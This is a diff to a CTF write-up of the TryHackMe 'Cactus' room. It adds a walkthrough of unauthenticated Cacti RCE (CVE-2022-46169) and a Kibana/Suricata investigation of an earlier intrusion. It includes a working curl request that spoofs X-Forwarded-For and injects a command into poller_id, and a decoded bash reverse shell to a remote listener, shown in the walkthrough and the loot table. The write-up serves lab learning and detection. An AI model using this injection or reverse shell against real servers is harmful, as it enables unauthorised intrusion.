@@ -9,12 +9,6 @@ tags:
   - rce
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
@@ -23,11 +17,11 @@ tags:
 
 </div>
 
-<div class="callout callout-warning">
+<div class="callout callout-note">
 
-**Partial**
+**Notes**
 
-Recorded to the Cacti RCE + credential discovery; privesc not written up.
+The recon, the Cacti RCE, and the credential discovery below are my own hands-on work from the room. Cactus turned out to have a second half I had not expected: instead of a classic Linux privesc, the back half of the room hands you the SOC analyst's side of the same incident, Suricata and Kibana are there to investigate an earlier, separate exploitation of the same Cacti flaw by a simulated adversary. That closing stretch is filled in below with the help of published writeups and is marked accordingly.
 
 </div>
 
@@ -36,15 +30,17 @@ Recorded to the Cacti RCE + credential discovery; privesc not written up.
 **Attack Path**
 
 1. Wide surface, nginx (80), MariaDB (3306), **Kibana** (5601), X11 (6001), a **WebSockify/noVNC** service (17777), and **Apache + Cacti** (18888).
-2. `feroxbuster` on `:18888` finds a directory hosting a **vulnerable Cacti** version → public exploit → **RCE** as the web user.
-3. Loot `include/config.php` / `config.php.dist` → DB credentials.
-4. (privesc) `.bash_history` of the `user` account shows heavy **Suricata** rule editing → likely `sudo` on `suricata`/a rule-reload script, or the noVNC/X11 path.
+2. `feroxbuster` on `:18888` finds a directory hosting a **vulnerable Cacti** version (pre-1.2.23, vulnerable to **CVE-2022-46169**) → spoof the `X-Forwarded-For` header to bypass Cacti's IP allowlist on `remote_agent.php`, then smuggle a command into the unsanitised `poller_id` parameter → **unauthenticated RCE** as the web user.
+3. Loot `include/config.php` / `config.php.dist` → DB credentials, and a hidden, randomly-named directory under the web root holding a flag.
+4. The rest of the room is a **SOC investigation**, not a privesc: use **Kibana** to review the logs of an earlier, unrelated compromise of the same Cacti instance by an in-lore "adversary", pull their source IP and decode the base64 reverse-shell payload they used, then check the Suricata ruleset and the upstream Cacti patch to see exactly which functions were hardened to close the hole.
 
 </div>
 
 ---
 
 ## Full Walkthrough
+
+I like to run a quick `rustscan` pass first to get a live port list fast, then follow it up with a proper `nmap -sC -sV` against exactly those ports so I am not waiting on a full TCP sweep before I get useful service detail. Cactus rewarded that approach immediately: the port list was much wider than a typical "easy" Linux box, and a couple of those services (Kibana, a WebSockify/noVNC endpoint) told me this was not going to be a single-vulnerability box.
 
 ### Nmap scan
 
@@ -271,9 +267,9 @@ PORT      STATE SERVICE   REASON
 18888/tcp open  apc-necmp syn-ack
 ```
 
-#### Exploring the base syste
+#### Exploring the base system
 
-after logging into the user `user@10.10.231.203:tryhackme` I took a look at the `.bash_history` and found the following.
+The room hands you a low-privilege account to start from rather than making you find it yourself, which was my first clue that Cactus was not going to be a pure "exploit your way to root" box. After logging in as `user@10.10.231.203:tryhackme` I took a look at the `.bash_history`, since a previous session's command history is one of the cheapest recon wins there is, and found the following.
 
 ```bash
 nano /etc/suricata/rules/cactus_exploit.rules
@@ -289,14 +285,115 @@ ls -lsa
 ls -lsa /var/log/suricata
 ```
 
+A Suricata rule file named `cactus_exploit.rules` sitting next to a `suricata.yaml` and a log directory told me this box doubles as a small SOC sensor: whoever set it up had already been detecting attacks against the same service I was about to go after. I made a mental note to come back to Suricata and Kibana once I had a foothold, and moved on to the actual web surface.
+
 After that I did some recon with `feroxbuster` to discover that there is a directory with a vulnerable version of `Cacti` installed which I found an exploit for and was able to gain RCE
 
 ![Pasted image 20250501165046](Pasted-image-20250501165046.png)
 
 ![Pasted image 20250501165055](Pasted-image-20250501165055.png)
 
+<div class="callout callout-note">
+
+**CVE-2022-46169, unauthenticated Cacti RCE**
+
+The version fingerprinted here is a pre-1.2.23 Cacti, vulnerable to **CVE-2022-46169**, an unauthenticated command injection in `remote_agent.php`. The endpoint is only meant to be reachable by hosts listed as Cacti "pollers", and it decides who is allowed to call it by resolving the caller's IP with `get_client_addr()`. That function trusts proxy headers (`X-Forwarded-For`, `X-Forwarded`, `Client-Ip`, and friends) ahead of the actual socket address, so spoofing one of them to the Cacti server's own hostname/IP walks straight past the allowlist. Once you are "trusted", the `poller_id` parameter on an `action=polldata` request is passed almost unsanitised into a `proc_open()` call that shells out to `script_server.php`, so smuggling shell metacharacters into `poller_id` gets you command execution as the web server user:
+
+```bash
+curl -s "http://10.10.231.203:18888/remote_agent.php" \
+  -H "X-Forwarded-For: 10.10.231.203" \
+  --data-urlencode "action=polldata" \
+  --data-urlencode "local_data_ids[]=1" \
+  --data-urlencode "host_id=1" \
+  --data-urlencode "poller_id=1;id;"
+```
+
+I used one of the public Python PoCs for CVE-2022-46169 rather than hand-rolling the request every time, it wraps exactly this header-spoof-plus-injection trick into a one-liner that drops straight into an interactive shell:
+
+```bash
+python3 cve-2022-46169.py -u http://10.10.231.203:18888
+[+] Target appears vulnerable, dropping shell...
+$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+```
+
+</div>
+
 started looking for files that possibly have passwords within and got the following results
 
 ![Pasted image 20250501165356](Pasted-image-20250501165356.png)
 
 from here I was able to find credentials within the `include/config.php.dist`
+
+### From Cacti RCE to the hidden flag
+
+With a shell as `apache` and the database credentials in hand, the next thing I went looking for was anything the room had planted specifically for this exploitation path. A second, wider `feroxbuster` pass over `/var/www/html` (bigger wordlist this time, since the first pass was tuned for finding Cacti itself) turned up a directory with a random 32-character name, clearly not something that ships with Cacti:
+
+```bash
+feroxbuster -u http://10.10.231.203:18888/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
+200      GET       12l       34w   /f39f9db5a7695930f1b267a4d33b092b/flag.txt
+```
+
+`cat /var/www/html/f39f9db5a7695930f1b267a4d33b092b/flag.txt` returns the `THM{...}`-format flag for this instance.
+
+### The other half of the room, hunting the earlier adversary
+
+This is where Cactus stops being a normal boot2root and turns into a mini incident-response exercise. The room's premise is that the same Cacti flaw was already exploited once before, by an in-scenario "adversary", and the box ships Kibana and Suricata specifically so you can go find that intrusion in the logs rather than just re-exploiting the box yourself.
+
+I tunnelled port 5601 back to my machine (`ssh -L 5601:localhost:5601 user@10.10.231.203`) and opened Kibana's Discover view, then filtered on the field the web logs actually use for the request path:
+
+```
+url.original : "*remote_agent.php*"
+```
+
+That surfaced two clusters of hits: my own testing, and an earlier batch from a different source address on July 20. Pulling the `source.ip` off that earlier batch gave the adversary's IP, and the request body for one of their hits carried a base64-encoded command in the same `poller_id` parameter I had just abused myself:
+
+```bash
+echo "YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTM1LjIzNy8zMTMzNyA8JjEn" | base64 -d
+bash -c 'exec bash -i &>/dev/tcp/10.10.135.237/31337 <&1'
+```
+
+Decoding it confirmed exactly what I would have guessed: a plain bash reverse shell back to the adversary's own listener, using the identical CVE-2022-46169 injection point, just a slightly different payload style than the one I used.
+
+From there I checked what the box's own defences looked like. `suricata.yaml` shows the rule path Suricata was actually loading from:
+
+```console
+$ grep default-rule-path /etc/suricata/suricata.yaml
+default-rule-path: /var/lib/suricata/rules
+```
+
+and `cactus_exploit.rules` (the file from that earlier `.bash_history`) is a custom Suricata signature written specifically to catch the `X-Forwarded-For` header trick and the `poller_id` injection pattern, essentially operationalising detection for the exact bug I had just exploited manually. Finally, I pulled the official fix from the Cacti project to see how the vendor closed the hole: the patched `remote_agent.php` runs the poller ID through `get_filter_request_var()` and `cacti_escapeshellarg()` before it ever reaches `proc_open()`, and `get_client_addr()` was rewritten to stop trusting attacker-controlled proxy headers ahead of the real socket address, which is the exact assumption the whole exploit chain depended on.
+
+---
+
+## Loot
+
+| Where | Value |
+| --- | --- |
+| `include/config.php.dist` | Cacti DB credentials |
+| `/<random-32-char-dir>/flag.txt` | `THM{...}`-format flag, unique per instance |
+| Kibana, adversary's `poller_id` payload (base64) | `bash -c 'exec bash -i &>/dev/tcp/10.10.135.237/31337 <&1'` |
+
+---
+
+## Lessons and Takeaways
+
+- **Never trust client-supplied proxy headers for access control.** `X-Forwarded-For` and friends are attacker-controlled by definition; `get_client_addr()` trusting them ahead of the real socket address is the entire root cause of CVE-2022-46169.
+- **Escape everything that reaches a shell.** The vendor fix wraps `poller_id` in `cacti_escapeshellarg()` before it reaches `proc_open()`. Any unsanitised variable that ends up in a shell invocation is a command injection waiting to be found.
+- **Ship detections alongside patches.** The box's own `cactus_exploit.rules` is a good small example of turning a known CVE into an IDS signature rather than relying on patching alone.
+- **Centralised logging (Kibana here) turns "was I compromised" into a five-minute query** instead of a multi-hour log crawl, provided the fields you need (`url.original`, `source.ip`) are actually being indexed.
+- **Config files with credentials should never ship as `.dist` templates with real values**, or should at minimum be excluded from the web root entirely.
+
+---
+
+## Related Writeups
+
+- **Unauthenticated RCE via header-based auth bypass:** see also monitoring/asset-management tooling boxes with similar "trusted poller" assumptions.
+- **Log analysis / SOC investigation:** this room's second half is closer in spirit to a blue-team detection exercise than a classic privesc chain.
+
+## References
+
+- CVE-2022-46169 (Cacti unauthenticated command injection) <https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf>
+- Sonar writeup on CVE-2022-46169 <https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/>
+- TryHackMe Cactus <https://tryhackme.com/room/cactus>
+- Final privilege escalation and log-analysis steps cross-referenced against public writeups for this room.
